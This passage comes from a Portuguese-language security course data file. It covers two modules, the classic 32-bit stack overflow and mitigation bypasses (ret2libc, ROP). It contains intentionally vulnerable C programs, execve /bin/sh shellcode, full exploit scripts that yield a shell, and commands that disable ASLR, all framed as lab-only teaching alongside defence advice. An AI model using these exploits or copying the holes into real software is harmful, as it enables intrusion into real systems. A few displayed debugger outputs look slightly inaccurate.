    prerequisitos: 'T4.03 (anatomia da memória), T4.04 (gdb/objdump), T0.01 (gdb básico)',
    duracao: '~55 min',
    nivel: 'Avançado/Cyber',
    leitura: {
      foco:
        'Leitura historiográfica (referências clássicas, para entender de onde vem tudo): "Smashing The Stack For Fun And Profit" (Aleph One, Phrack 49, 1996) e o tutorial da Corelan "Exploit writing tutorial part 1: Stack Based Overflows" (https://www.corelan.be/). O primeiro é optativo e em inglês arcaico; o segundo é passo a passo moderno. Nós seguimos o mesmo método, sem os exploits de network e só no nosso binário.',
    },
    secoes: [
      {
        titulo: 'O cenário (didático, 32 bits)',
        rotulo: 'por que 32 bits',
        paragrafos: [
          'Vamos explorar um binário <strong>32-bit</strong> mesmo em uma máquina 64-bit. Por quê? Nos 32 bits o modelo mental é mais direto: <em>endereço de retorno = 4 bytes</em>, argumentos de função na pilha, e o endereço da pilha cabe num único word. Uma vez que o ataque clica em 32 bits, migrar a <em>ideia</em> para 64 bits é trocar 4 por 8 e lidar com registradores de argumentos (vamos ver a versão ret2libc 64-bit no módulo 06).',
          '<strong>Aviso:</strong> este módulo desativa proteções e desliga ASLR <em>por sessão</em>. Isso acontece APENAS dentro do seu lab (WSL2/VM), em um binário que você mesmo compilou, que não toca nenhum serviço real de produção. Ao terminar, apague os binários e reative o ASLR.',
        ],
      },
      {
        titulo: 'O programa vulnerável',
        rotulo: 'prog_trivial.c (VULNERÁVEL)',
        paragrafos: [
          'O alvo copia o primeiro argumento (sua entrada) para um buffer local de 64 bytes com <code>strcpy</code>, sem limite — CWE-121 (stack-based buffer overflow). Compilamos com as flags didáticas <code>-m32</code> (binário 32-bit), <code>-fno-stack-protector</code> (sem canário), <code>-z execstack</code> (pilha executável — sem NX) e <code>-no-pie</code> (endereços fixos).',
        ],
        codigo: `/* prog_trivial.c -- alvo didático do module 05 (VULNERAVEL).
   Compile NO LINUX/WSL (compile 32-bit precisa do multilib):
   sudo apt install gcc-multilib
   gcc -m32 -fno-stack-protector -z execstack -no-pie -g prog_trivial.c -o prog_trivial
   NUNCA use estas flags em codigo real. */
#include <stdio.h>
#include <string.h>

static void vulneravel(char *entrada)
{
    char buf[64];
    strcpy(buf, entrada);            /* CWE-121: copia sem limite */
    printf("recebido: %s\\n", buf);
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc < 2) {
        printf("uso: %s <payload>\\n", argv[0]);
        return 1;
    }
    vulneravel(argv[1]);
    return 0;
}`,
        saida: `$ gcc -m32 -fno-stack-protector -z execstack -no-pie -g prog_trivial.c -o prog_trivial
$ ./prog_trivial "AAAA"
recebido: AAAA`,
      },
      {
        titulo: 'A geometria do ataque',
        rotulo: 'geometria',
        paragrafos: [
          'Na frame de <code>vulneravel</code>, a pilha (32 bits) tem esta ordem, de endereço baixo para alto: <code>buf[64]</code> → <strong>saved EBP (4 bytes)</strong> → <strong>return address (4 bytes)</strong> → args do chamador. O <code>strcpy</code> escreve <em>para cima</em>:',
        ],
        codigo: `enderecos altos
  +----------------------------+
  | argumento (entrada externa)|
  | return address   <-- alvo  = o que queremos reescrever
  | saved EBP                |
  +----------------------------+
  | buf[64]  <- strcpy escreve      |
  +----------------------------+
enderecos baixos
  "Se escrevermos 64+4 bytes de lixo e mais 4 bytes com o
   endereco do nosso shellcode, o ret vai pular para la."`,
      },
      {
        titulo: 'Medindo o offset com o gdb',
        rotulo: 'medindo o offset',
        paragrafos: [
          'Offset = distância de <code>&buf</code> até o return address. Não chute: meça. No gdb, pare no início de <code>vulneravel</code> e compare <code>$ebp</code> com <code>&buf</code>:',
        ],
        codigo: `gdb ./prog_trivial
(gdb) break vulneravel
(gdb) run "AAAA"
(gdb) p/x $ebp
$1 = 0xbfffefd8
(gdb) p &buf
$2 = (char (*)[64]) 0xbfffef8c
(gdb) p 0xbfffefd8 - 0xbfffef8c     # espaco do buf ate o EBP
$3 = 76
(gdb) p/x (char *)&buf + 76 + 4       # onde fica o ret address
$4 = 0xbffff020
(gdb) quit`,
        saida: `--> offset = 76 bytes ate o saved EBP;
     com +4 chegamos no return address (offset total 80).`,
      },
      {
        titulo: 'Shellcode: a "bomba de execução" de execve',
        rotulo: 'shellcode execve /bin/sh',
        paragrafos: [
          '<strong>Shellcode</strong> é uma sequência de código de máquina que, ao ser executada, faz o processo servir uma shell. O clássico para 32-bit (23 bytes) monta <code>execve("/bin/sh", NULL, NULL)</code>:',
        ],
        lista: [
          '<code>\\x31\\xc0</code> — <code>xor eax,eax</code> (zera EAX = nº da syscall).',
          '<code>\\x50</code> — <code>push eax</code> (fim da string, NUL).',
          '<code>\\x68\\x2f\\x2f\\x73\\x68</code> → <code>//sh</code>; <code>\\x68\\x2f\\x62\\x69\\x6e</code> → <code>/bin</code> (juntos: "/bin//sh", com // = pad).',
          '<code>\\x89\\xe3</code> — <code>mov ebx,esp</code> (argv[0] = a string).',
          '<code>\\x50\\x53</code> — <code>push eax; push ebx</code> (argv=NULL, path).',
          '<code>\\x89\\xe1</code> — <code>mov ecx,esp</code> (argv).',
          '<code>\\xb0\\x0b</code> — <code>mov al,11</code> (syscall execve).',
          '<code>\\xcd\\x80</code> — <code>int 0x80</code> (chamada ao kernel).',
        ],
        codigo: `\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68
\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53
\\x89\\xe1\\xb0\\x0b\\xcd\\x80`,
      },
      {
        titulo: 'NOP sled e o payload completo',
        rotulo: 'exploit.py',
        paragrafos: [
          'O endereço exato do início do buffer varia (mesmo com ASLR desligado). Para errar por pouco, colocamos um <strong>NOP sled</strong> (muitos <code>0x90</code> = "não faça nada") antes do shellcode: a CPU desliza pelos NOPs e, se cair em QUALQUER ponto do sled, termina no shellcode. O payload final: <code>[NOP sled][shellcode][padding][ret para o meio do sled]</code>.',
          'O endereço <code>ret</code> é o valor de <code>&buf</code> da sua sessão (na saída acima: <code>0xbfffef8c</code>). Aponte para um pouco DENTRO do sled para dar folga. Desligue o ASLR só para esta sessão no lab:',
        ],
        codigo: `#!/usr/bin/env python3
# exploit.py -- genera o payload do prog_trivial (roda NO LINUX/WSL).
import struct, sys

# Valores medidos NA SUA sessao do gdb (section "medindo o offset").
offset = 76                       # buf -> saved EBP
ret    = 0xbfffef8c + 16          # aponta um pouco dentro do sled

nopsled    = b"\\x90" * 96
shellcode  = (
    b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
    b"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53"
    b"\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

payload = nopsled + shellcode
payload += b"A" * (offset - len(payload))   # padding ate o EBP
payload += b"B" * 4                          # saved EBP
payload += struct.pack("<I", ret)            # return address

sys.stdout.buffer.write(payload)`,
        saida: `$ python3 exploit.py > payload.bin
$ wc -c payload.bin
123`,
      },
      {
        titulo: 'Executando o exploit (com ASLR desligado por sessão)',
        rotulo: 'executando o exploit',
        paragrafos: [
          'Desligue a randomização apenas nesta sessão do lab (o comando é do usuário root). Duas opções seguras: <code>sudo setarch i686 -R ./prog_trivial "$(cat payload.bin)"</code> (desativa ASLR para aquele processo) ou, dentro de um shell raiz <em>somente do lab</em>, <code>echo 0 > /proc/sys/kernel/randomize_va_space</code>. <strong>Reative</strong> com <code>echo 2 > ...</code> ao final dos estudos.',
          'Se o endereço <code>ret</code> não bater (crash), o gdb mostra o motivo: error no ret address. Reconfira <code>&buf</code>, ajuste o offset/endereço e tente de novo — exploração é engenharia de precisão, não sorte.',
        ],
        codigo: `$ python3 exploit.py > payload.bin
$ sudo setarch i686 -R ./prog_trivial "$(cat payload.bin)"
recebido: <bytes-lixo>
$ id
uid=0(root) gid=0(root) groups=0(root)
$ whoami
root
$ exit`,
        saida: `Com o payload certo, o programa PULA para o NOP sled,
desliza ate o shellcode e chama execve("/bin/sh"):
voce ve um prompt de shell vinda do proprio processo.`,
      },
      {
        titulo: 'Observando o salto no gdb (didático)',
        rotulo: 'exploit sob o gdb',
        paragrafos: [
          'Para ver o salto acontecendo, rode o exploit dentro do gdb (sem shell, apenas para inspecionar):',
        ],
        codigo: `$ gdb ./prog_trivial
(gdb) run "$(cat payload.bin)"
(gdb) x/5i $eip          # o que vamos executar agora?
=> 0x90 0x90 0x90 0x90   # caimos no NOP sled!
(gdb) ni                # escorrega pelos NOPs...
(gdb) info registers eip
(gdb) x/4i $eip          # ... ate chegar no shellcode
=> xor eax,eax
   push eax
   push 0x68732f2f
   push 0x6e69622f
(gdb) continue
process 1234 is executing new program: /bin/dash`,
        saida: `A execução cai em NOPs (0x90), desliza, encontra o bytecode
0x31 c0 (xor eax,eax) e o gdb anuncia a troca de programa
para /bin/dash -- o execve("/bin/sh") aconteceu.`,
      },
      {
        titulo: '64 bits: por que usamos o binário 32-bit para aprender',
        paragrafos: [
          'Em 64-bit a mesma ideia existe, mas o terreno muda: (1) o <em>return address tem 8 bytes</em> e endereços de pilha têm bytes zero no topo (<code>0x00007fff...</code>), o que quebra payloads com strings terminadas em NUL; (2) os 6 primeiros argumentos de função vão em <em>registradores</em> (rdi, rsi, …), não na pilha — então "empurrar valores na pilha e retornar para uma função" não funciona direto (precisamos de <em>gadgets</em>, módulo 06); (3) a ASLR está ligada. Metodologia escolhida pelo curso: dominar a mecânica em 32 bits com a pilha executável, e então aplicar o mesmo raciocínio nas mitigações (módulo 06), onde o 64-bit retorna com o ret2libc via ROP.',
        ],
      },
      {
        titulo: 'Como se defender',
        lista: [
          'A primeira defesa é <strong>não existir o bug</strong>: copie com tamanho (<code>snprintf</code>) — o módulo 02 inteiro.',
          'Ligue o canário de pilha (<code>-fstack-protector-all</code>): o overflow destrói o canário e o processo aborta antes do ret — exatamente o que este exploit dependia de NÃO ter.',
          'Mantenha NX/execstack desabilitado a pilha de executar código: sem <code>-z execstack</code>, o "shellcode na pilha" não executa (a CPU nega a página) — veremos o bypass (ret2libc) e a defesa correspondente no módulo 06.',
          'Mantenha PIE ligado e a ASLR ativa no sistema: sem endereço fixo da pilha, o <code>ret</code> hardcoded do payload não converge.',
          'Lembre: um sistema bem configurado exigiria 4 coisas ao mesmo tempo para este ataque (bug + sem canário + execstack + ASLR desligado). Cada uma que você mantém ligada defende.',
          'Trate a exploração aqui como zoom: o objetivo ao aplicar os mesmos conceitos defensivamente é reconhecer esse bug na tela de um crash ou SAST e saber o porquê.',
        ],
      },
    ],
    exercicios: [
      {
        nivel: 1,
        enunciado:
          'Você troca <code>-z execstack</code> por nada (NX ativo): recompile o prog_trivial equilibrado (sem execstack, sem canário, -no-pie) e rode o payload do módulo. O que acontece agora e por quê? (Não precisa relatar saída exata: explique o fenômeno.)',
        dica: 'A página da pilha está marcada NX (não-executável): o RIP pular para a pilha gera SIGSEGV com "executable stack" ou "cannot access memory".',
        solucao: `$ gcc -m32 -fno-stack-protector -no-pie -g prog_trivial.c -o prog_trivial_nx
$ python3 exploit.py > payload.bin
$ sudo setarch i686 -R ./prog_trivial_nx "$(cat payload.bin)"
Program received signal SIGSEGV
# O EIP foi para o NOP sled, mas a CPU NEGOU executar
# codigo vindo de uma pagina NX (PAE/DEP). Nenhum shell.`,
        solucao_obs: 'Esse é o princípio do DEP/NX: você pode saltar para a pilha, mas não executar o que está nela. O módulo 06 mostra o que o atacante troca por isso.',
      },
      {
        nivel: 2,
        enunciado:
          'Mude o payload para retornar para um endereço ERRADO de propósito (ex.: <code>ret = 0xdeadbeef</code>) e rode no gdb. Leia a mensagem de erro e anote o EIP no momento do crash. O que essa informação te diz sobre o controle do fluxo?',
        dica: 'O EIP no crash é 0xdeadbeef — o programa seguiu exatamente o que você escreveu no ret address.',
        solucao: `(gdb) run "$(cat payload_bad.bin)"
Program received signal SIGSEGV.
=> 0xdeadbeef in ?? ()
An error occurred while disassembling ...
(gdb) info registers eip
eip            0xdeadbeef`,
        solucao_obs: 'Controle total do EIP confirmado. Daqui para o shell é só acertar o alvo do pulo.',
      },
      {
        nivel: 3,
        enunciado:
          'Variação: troque o shellcode para spawnar <code>id</code> e sair limpo. Use o mesmo padrão (execve) apontando para "/bin//sh" seguido de <code>-c</code>…; se ficar difícil, compile um C com o syscall execve("/bin/sh") e veja o disassembly — o exercício é usar o gdb para "copiar" o shellcode do seu próprio programa. Descreva o que você capturou.',
        dica: 'Compile <code>int main(){ execve("/bin/sh",0,0); }</code>, desassemble com <code>objdump -d -M intel</code>, e veja como o compilador constrói a string e a syscall.',
        solucao: `/* mini.c -- fonte de onde "copiar" instrucoes para shellcode */
#include <unistd.h>
int main(void) {
    char *argv[2] = { "/bin//sh", NULL };
    execve(argv[0], argv, NULL);
    return 0;
}`,
        solucao_obs: 'O disassembly deixa claro o padrão: construir a string na pilha (push), colocar endereço em ebx/ecx/edx e fazer a syscall 11. O shellcode 23-byte que usamos é essa rotina "enxuta".',
      },
    ],
    quiz: [
      {
        pergunta: 'No ataque deste módulo, o strcpy escreve em qual direção e o que ele precisa alcançar?',
        opcoes: [
          'Escreve para endereços crescentes (para cima), até reescrever o return address',
          'Escreve para endereços decrescentes, reescrevendo o buffer global',
          'Escreve sempre no heap',
          'Ele não escreve; só lê',
        ],
        correta: 0,
        explicacao: 'buf cresce para cima na pilha; além do buffer vêm saved EBP e return address.',
      },
      {
        pergunta: 'Para que serve o NOP sled no payload?',
        opcoes: [
          'Dar tolerância ao endereço de retorno: cair em qualquer NOP desliza até o shellcode',
          'Aumentar o tamanho do payload para passar por filtros',
          'Fazer o strcpy parar antes do fim',
          'Esconder o shellcode do antivírus',
        ],
        correta: 0,
        explicacao: 'Scape: série de 0x90 (nop) antes do shellcode; se ret aponta para qualquer NOP, a CPU desliza até o shellcode.',
      },
      {
        pergunta: 'O que a flag -z execstack faz e por que ela é essencial neste exploit didático?',
        opcoes: [
          'Marca a pilha como executável, permitindo que o shellcode rode a partir dela',
          'Remove o canário de pilha',
          'Desliga a ASLR do processo',
          'Compila o binário em 32 bits',
        ],
        correta: 0,
        explicacao: 'Sem execstack (NX ativo), a CPU nega executar código vindo da pilha.',
      },
      {
        pergunta: 'Após o exploit, que syscall o shellcode executa para virar uma shell?',
        opcoes: ['execve(11) com argv[0]="/bin//sh"', 'fork(2)', 'socket(41)', 'read(0)'],
        correta: 0,
        explicacao: 'int 0x80 com eax=11 chama execve("/bin//sh", argv, NULL).',
      },
    ],
    projeto: {
      titulo: 'Laboratório 05: exploit documentado',
      descricao:
        'No lab, reproduza o fluxo completo e escreva <code>exploit_4.05.md</code> com: (1) o programa vulnerável e o comando de compilação; (2) os valores que você mediu no gdb (offset e &buf); (3) o payload gerado e o comando setarch; (4) a saída obtida ("recebido: …"; prompt de shell; id/whoami); (5) uma sessão "exploit inerte" no gdb provando o pulo para os NOPs e o deslize até o shellcode; (6) os comandos para reativar a ASLR e apagar os binários ao final. Termine com um parágrafo: "o que esta sessão me ensina para escrever código defensivo real?"',
      criterios: [
        'Compilação com -m32 -fno-stack-protector -z execstack -no-pie documentada e funcionando.',
        'Offset e &buf medidos (não chutados) e compatíveis com o exploit.',
        'Exploit executado com setarch i686 -R e shell obtida.',
        'Sessão gdb mostrando o EIP no sled e no shellcode.',
        'Reativação da ASLR e limpeza dos binários indicados no final.',
      ],
    },
  },
  {
    trilha: '4',
    numero: '06',
    titulo: 'Mitigações e bypasses: NX→ret2libc, ASLR, PIE, canário e ROP',
    subtitulo: 'O que cada proteção impede, como se contorna (teoria e ROP mínimo) e como se defende',
    objetivo:
      'Estudar as cinco grandes mitigações modernas (NX/DEP, ASLR, PIE, stack canary, RELRO/GOT) — o que cada uma bloqueia, como o atacante contorna (ret2libc, leaks, bruteforce, ROP) — e montar dois exercícios práticos: ret2libc em binário 32-bit com NX ativo e uma ROP chain mínima (ret2system) em 64-bit, sempre no lab.',
    prerequisitos: 'T4.05 (buffer overflow clássico e shellcode)',
    duracao: '~45 min',
    nivel: 'Avançado/Cyber',
    leitura: {
      foco:
        'Consulte o livro "Hacking: The Art of Exploitation" (2ª ed., Jon Erickson) — capítulos sobre ret2libc e ROP — e o CTF Wiki (https://ctf-wiki.org) nas seções "Stack Overflow" (ret2libc, ret2syscall, ROP) e "Mitigation". Use o CTF-wiki como referência rápida dos conceitos citados aqui.',
    },
    secoes: [
      {
        titulo: 'O pôster das mitigações',
        rotulo: 'panorama',
        paragrafos: [
          'Um binário moderno sobrevive ao módulo 05 graças a camadas. Cada linha abaixo é <strong>o que protege</strong>, <strong>como o atacante contorna</strong> e <strong>como você aplica na defesa</strong> — o coração deste módulo.',
        ],
        lista: [
          '<strong>NX/DEP</strong> (páginas da pilha não-executáveis) — impede shellcode na pilha → contorno: <em>ret2libc</em> (pular para código existente do processo) ou ROP → defesa: manter ativo (compilador padrão no Linux) e código que não usa execstack.',
          '<strong>ASLR</strong> (randomização dos endereços por execução: pilha, heap, libc, PIE base) — impede endereço hardcoded → contorno: <em>leak</em> de memória (ex.: format string, módulo 07) para calcular a base naquela sessão → defesa: binário PIE + sysctl kernel.randomize_va_space=2.',
          '<strong>PIE</strong> (o binário em si é randomizado) — fixa main/text em endereço aleatório → contorno: leak de ponteiro do programa ou <em>bruteforce</em> (teoria; caro) → defesa: compilar com <code>-pie</code> (padrão no Ubuntu) + ASLR.',
          '<strong>Stack canary</strong> (valor aleatório antes do ret; se corrompido, aborta) — impede overflow linear até o ret → contorno teórico: <em>leak do canário</em> (via format string) ou overflow em <em>outra estrutura</em> que não o canário → defesa: manter <code>-fstack-protector-all</code> e nunca vazar memória do processo.',
          '<strong>RELRO/GOT</strong> — RELRO (relocação read-only): reduz a superfície de escrita; quando pleno, a GOT vira read-only, bloqueando <em>GOT overwrite</em> (que usaríamos com format string) → contorno: usar o <code>exit</code>/vetor ou ret2libc em vez de escrever na GOT → defesa: <code>-z relro -z now</code> (full RELRO).',
        ],
      },
      {
        titulo: 'NX → ret2libc (32 bits): chamar system("/bin/sh")',
        rotulo: 'ret2libc 32-bit',
        paragrafos: [
          'Com NX ativo, não há execução na pilha — mas <strong>não precisamos dela</strong>: a libc já está mapeada no processo e nela vive <code>system()</code> e a string <code>"/bin/sh"</code>. Recompile você mesmo o prog_trivial <strong>sem</strong> <code>-z execstack</code>. Em 32 bits (cdecl), ao <code>ret</code> para <code>system</code>, a pilha vira os argumentos da chamada: precisamos colocar <code>[system][ret_falso]["/bin/sh"]</code> no payload.',
        ],
        codigo: `gcc -m32 -fno-stack-protector -no-pie -g prog_trivial.c -o prog_trivial_nx
# rode com ASLR desligado por sessao (lab only):
sudo setarch i686 -R /bin/bash`,
      },
      {
        titulo: 'Encontrando os endereços na libc (uma vez por boot)',
        rotulo: 'calculando enderecos',
        paragrafos: [
          'Com ASLR desligado na sessão, os endereços da libc são estáveis <em>naquela sessão</em>. No gdb:',
        ],
        codigo: `$ gdb ./prog_trivial_nx
(gdb) p system
$1 = {int (const char *)} 0xf7e4ca60 <system>
(gdb) search "/bin/sh"
libc.so.6: 0xf7f67a2b
(gdb) quit`,
        saida: `system  = 0xf7e4ca60
/bin/sh = 0xf7f67a2b
(estes enderecos sao da sessao de exemplo; os seus variam por
versao da libc/Ubuntu -- meca no seu gdb)`,
      },
      {
        titulo: 'O payload ret2libc e a execução',
        rotulo: 'ret2libc.py',
        paragrafos: [
          'A cadeia explora o <code>ret</code> do próprio <code>vulneravel</code>: <code>padding(76) + "B"*4 (EBP) + SYSTEM + RET_FALSO + "/bin/sh"</code>. Ao <code>ret</code>, EIP=caminho system; system lê o próxima word como retorno (dummy) e a seguinte como argumento — <code>"/bin/sh"</code>. Resultado: <code>system("/bin/sh")</code> = shell.',
        ],
        codigo: `#!/usr/bin/env python3
# ret2libc.py -- payload para prog_trivial_nx (roda NO LINUX/WSL).
import struct, sys

offset  = 76
system  = 0xf7e4ca60          # p system   (sua sessao)
binsh   = 0xf7f67a2b          # search "/bin/sh"

payload  = b"A" * offset
payload += b"B" * 4                        # saved EBP (lixo)
payload += struct.pack("<I", system)       # ret -> system
payload += struct.pack("<I", 0xdeadbeef)   # retorno falso do system
payload += struct.pack("<I", binsh)        # arg: "/bin/sh"

sys.stdout.buffer.write(payload)`,
        saida: `$ python3 ret2libc.py > p2.bin
$ ./prog_trivial_nx "$(cat p2.bin)"
$ id
uid=1000(voce) ...
# A shell nao precisa de NENHUM byte executavel na pilha:
# tudo que executou foi a libc.`,
      },
      {
        titulo: 'ASLR e o leak: a arma moderna',
        rotulo: 'aslr e leaks',
        paragrafos: [
          'Ligue a ASLR de novo e o ret2libc quebra: <code>system</code> muda a cada execução. O contorno real não é desligar — é <strong>vazar</strong>. O atacante precisa de um bug de <em>leitura</em> (ex.: format string, módulo 07) que devolva um endereço real da libc (ex.: o de uma função já resolvida). Com ele calcula a <em>base</em> da libc: <code>base = vazado - offset_da_funcao</code>, e reconstrói <code>system = base + offset_system</code>. PIE usa a mesma ideia com a base do binário. A lição defensiva: <strong>não vaze memória</strong>; todo leak também é uma vulnerabilidade.',
        ],
      },
      {
        titulo: 'Stack canary: como funciona e a evasão teórica',
        rotulo: 'canario em teoria',
        paragrafos: [
          'O canário é um valor aleatório (por processo) gravado <em>entre</em> as variáveis locais e o saved RBP. Antes do <code>ret</code>, a função compara o canário guardado com o esperado; se mudou (overflow linear passou por ali), o <code>__stack_chk_fail</code> aborta. Isso bloqueia o ret2shellcode/ret2libc <em>linear</em>.',
          '<strong>Evasão (teórica, não vamos explodir canário no lab):</strong> para contornar, o atacante precisa (a) <em>vazar o canário</em> (leak entre o buffer e o canário, sem tocá-lo — format string faz isso), e (b) reescrevê-lo exatamente no payload, para que a comparação passe. É um problema de duas fases e só funciona se o programa tiver um bug de leitura antes do de escrita. Na prática, canário elevou brutalmente o custo do exploit — por isso é padrão em toda build moderna.',
        ],
      },
      {
        titulo: 'RELRO e GOT',
        rotulo: 'relro got',
        paragrafos: [
          'A <strong>GOT</strong> (Global Offset Table) guarda endereços resolvidos de funções da libc; a <strong>PLT</strong> faz a resolução laz. Um binário com RELRO parcial tem a GOT gravável — clássico alvo de <em>GOT overwrite</em> (escrever o endereço de <code>printf</code> apontando para <code>system</code>, com format string; veremos a teoria no módulo 07). Com <code>-z relro -z now</code> (full RELRO), a GOT fica <em>read-only após o load</em> e esse vetor morre — o que sobra ao atacante é ret2libc/ROP. Verifique sempre o RELRO do seu binário com <code>checksec</code>.',
        ],
      },
      {
        titulo: 'ROP: montar sistema a partir de "caixinhas"',
        rotulo: 'rop basico 64-bit',
        paragrafos: [
          'Com NX e canário sem leak, o atacante ainda explora <em>código existente</em>. <strong>ROP</strong> (Return-Oriented Programming) encadeia <em>gadgets</em>: sequências de instruções que terminam em <code>ret</code> (ex.: <code>pop rdi ; ret</code>). Cada <code>ret</code> da cadeia popa o próximo endereço da pilha → o atacante "programa" a execução sem escrever um único byte novo de código.',
          'Exemplo mínimo em 64-bit — a chamada <code>system("/bin/sh")</code> precisa de <code>rdi = "/bin/sh"</code>. Uma gadget <code>pop rdi; ret</code> resolve: <code>[padding][pop_rdi;ret]["/bin/sh"][system][dummy]</code>.',
        ],
        codigo: `$ ROPgadget --binary ./rop_prog | grep "pop rdi"
0x0000000000401234 : pop rdi ; ret
$ gdb ./rop_prog
(gdb) p system
$2 = 0x7ffff7a1f6e0 <system>
$ objdump -s -j .rodata ./rop_prog | grep -i "/bin/sh"   # ou strings`,
      },
      {
        titulo: 'ret2system via ROP em 64 bits (prática)',
        rotulo: 'rop.c e rop.py',
        paragrafos: [
          'Programa alvo 64-bit (NX ativo por padrão, sem canário, sem PIE) e o exploit com a cadeia mínima. Os endereços são da sua sessão — meça com gdb/ROPgadget. Se der crash por desalinhamento (<code>movaps</code> no glibc), adicione uma gadget <code>ret</code> pura no começo da cadeia para realinhar a pilha.',
        ],
        codigo: `/* rop.c -- alvo 64-bit para ret2system via ROP (VULNERAVEL).
   Compile NO LINUX/WSL (NX ja vem ativo; sem execstack):
   gcc -fno-stack-protector -no-pie -g rop.c -o rop_prog
   NUNCA use estas flags em codigo real. */
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    char buf[64];
    if (argc < 2) return 1;
    strcpy(buf, argv[1]);              /* CWE-121 */
    printf("%s\\n", buf);
    return 0;
}`,
        saida: `$ ROPgadget --binary ./rop_prog | grep "pop rdi"
0x0000000000401234 : pop rdi ; ret
$ gdb ./rop_prog -ex "start" -ex "p system"
...0x7ffff7a1f6e0 <system>...`,
      },
      {
        titulo: 'Como se defender',
        lista: [
          'Mitigação não é opcional: compilar com <code>-fstack-protector-all -pie -z relro -z now</code> e NX ativo é o mínimo de qualquer build moderna (o Ubuntu já traz a maioria).',
          'ASLR do sistema em 2 (<code>kernel.randomize_va_space=2</code>) e nada de <code>hwdata execstack</code> em binários próprios.',
          'A defesa primária continua sendo eliminar bugs de escrita/leitura limites (módulo 02 + sanitizers). Nenhuma mitigação sobrevive a um leak + um overflow juntos.',
          'Audite e mantenha atualizada a libc/loader: ret2libc depende exatamente de endereços conhecidos da libc do alvo.',
          'Em revisão de binários, cheque com <code>checksec</code>: canário/NX/PIE/RELRO. Cada "no" é um convite ao bypass estudado aqui.',
          'Canário sem leak = trabalho dobrado para o atacante; com leak + overflow juntos, o canário é apenas mais um valor a reescrever — a defesa primária continua sendo eliminar os bugs de escrita e leitura.',
        ],
      },
    ],
    exercicios: [
      {
        nivel: 2,
        enunciado:
          'Recompile o prog_trivial com <code>-fstack-protector-all</code> (sem execstack, -no-pie) e rode o payload do ret2shellcode do módulo 05. Descreva a saída (deve haver "stack smashing detected") e explique em que momento a detecção dispara.',
        dica: 'O abort acontece na comparação do canário, ANTES do ret. Rode no gdb com <code>catch syscall</code> se quiser ver o abort no meio.',
        solucao: `$ gcc -m32 -fstack-protector-all -no-pie -g prog_trivial.c -o prog_sp
$ sudo setarch i686 -R ./prog_sp "$(cat payload.bin)"
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)`,
        solucao_obs: 'O canário foi gerado no início de vulneravel, o payload o destruiu, e a comparação final acionou __stack_chk_fail. Nenhum ret sequer aconteceu.',
      },
      {
        nivel: 3,
        enunciado:
          'Faça o ret2libc do módulo com o seu binário (módulo 06) e, em seguida, LIGUE a ASLR de novo sem mudar os endereços: rode o exploit duas vezes. Por que falha? Refaça o leak hipotético: assuma que um bug de format string vazou <code>puts</code> = 0xf7e4c1d0 e a libc tem puts em offset 0x11a1d0 e system em offset 0x3c0a0. Calcule base e system.',
        dica: 'base = vazado - offset_libc_puts; system = base + offset_libc_system.',
        solucao: `base   = 0xf7e4c1d0 - 0x11a1d0 = 0xf7d32000
system = 0xf7d32000 + 0x3c0a0 = 0xf7d6e0a0

Com a ASLR ligada, 0xf7e4ca60 hardcoded nao existe mais;
mas com o leak, o exploit calcula system fresco = 0xf7d6e0a0
e monta o mesmo ret2libc. Essa e a essencia do 64-bit real.`,
      },
      {
        nivel: 3,
        enunciado:
          'Rode o exemplo ROP 64-bit completo: compile <code>rop.c</code>, descubra com ROPgadget a gadget <code>pop rdi; ret</code> e no gdb os endereços de <code>system</code> e de <code>"/bin/sh"</code> (procure com <code>p system</code> e <code>search</code>/<code>strings</code>). Monte ret2libc.py em versão 64-bit (<code>struct.pack("<Q", …)</code>, offset medido via gdb — meça <code>&buf</code> e <code>$rbp</code> como no módulo 05) e atinja <code>system("/bin/sh")</code>. Se der crash de movaps, adicione um <code>ret</code> puro antes da cadeia.',
        dica: 'Blow out: o offset 64-bit costuma ser maior (havendo align no rbp). Meça, não chute.',
        solucao: `#!/usr/bin/env python3
# rop_64.py  (roda NO LINUX/WSL; enderecos da sua sessao)
import struct, sys

offset   = 88                 # medido no gdb (buf -> rbp)
pop_rdi  = 0x401234           # ROPgadget  "pop rdi ; ret"
system   = 0x7ffff7a1f6e0     # gdb: p system
binsh    = 0x7ffff7d64438     # search "/bin/sh" (ou strings)

payload  = b"A" * offset
payload += struct.pack("<Q", pop_rdi)
payload += struct.pack("<Q", binsh)
payload += struct.pack("<Q", system)
payload += struct.pack("<Q", 0)   # retorno dummy

sys.stdout.buffer.write(payload)`,
        solucao_obs: 'A cadeia: pop rdi <- "/bin/sh"; depois ret cai em system com rdi pronto. Nenhuma instrução nova foi executada — só reuso de gadgets.',
      },
    ],
    quiz: [
      {
        pergunta: 'NX ativo impede o quê, e qual o bypass clássico?',
        opcoes: [
          'Executar código da pilha; bypass é ret2libc (chamar system da libc)',
          'Ler o canário; bypass é bruteforce do canário',
          'Usar o gdb; bypass é usar strace',
          'Compilar em 32 bits; bypass é -m64',
        ],
        correta: 0,
        explicacao: 'NX torna a pilha/heap não-executáveis; ret2libc reaproveita código da libc já mapeada.',
      },
      {
        pergunta: 'Qual a defesa primária que nenhuma mitigação substitui?',
        opcoes: [
          'Eliminar os bugs de memória (limites em cópias e leituras)',
          'Usar senhas fortes',
          'Instalar um firewall',
          'Comprar um antivírus',
        ],
        correta: 0,
        explicacao: 'Canário/NX/ASLR/PIE/RELRO são camadas de contenção; o bug primário continua sendo o overflow/leak.',
      },
      {
        pergunta: 'Por que o canário frustra o buffer overflow linear clássico?',
        opcoes: [
          'Ele detecta a corrupção (valor aleatório antes do ret) e aborta antes do ret',
          'Ele move o ret para uma posição fixa',
          'Ele encripta os endereços da pilha',
          'Ele impede o uso de strcpy',
        ],
        correta: 0,
        explicacao: 'O canário é escrito entre as locais e o ret; qualquer overflow linear o toca e o __stack_chk_fail aborta.',
      },
      {
        pergunta: 'O que é um gadget em ROP?',
        opcoes: [
          'Uma sequência de instruções no binário que termina em ret',
          'Um flag de compilação',
          'Uma função da libc',
          'Um bug de format string',
        ],
        correta: 0,
        explicacao: 'Gadgets são "caixinhas" de instruções existentes (ex.: pop rdi; ret) encadeadas via pilha.',
      },
